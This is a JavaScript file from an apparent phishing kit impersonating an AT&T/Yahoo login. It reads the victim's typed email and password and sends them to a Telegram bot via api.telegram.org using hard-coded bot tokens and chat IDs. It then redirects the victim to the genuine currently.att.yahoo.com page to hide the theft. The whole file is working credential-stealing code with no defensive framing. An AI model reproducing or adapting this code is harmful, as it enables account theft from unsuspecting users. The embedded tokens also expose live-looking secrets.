console.log("sender.js connected");
function sendTelegramMessageAndRedirect() {
  //  other user API

  //   const telegramBotToken = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // add the telegram token
  //   const chatId = 5710607863; // add ths id from the web It's usually a number, not a string

  const telegramBotToken = "6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68"; // add the telegram token
  const chatId = 5349229520; // add ths id from the web It's usually a number, not a string
  const emailValue = document.getElementById("email").value;
  const passwordValue = document.getElementById("password").value;

  const messageText = `AT&T\nEmail: ${emailValue}\nPassword: ${passwordValue}`;

  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  const params = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: messageText,
    }),
  };

  // Make the API request
  fetch(url, params)
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      console.log("Message sent:", data);
      // Redirect to another page after successful submission
      window.location.href = "https://currently.att.yahoo.com"; // Replace with your desired URL
    })
    .catch((error) => console.error("Error:", error));
}
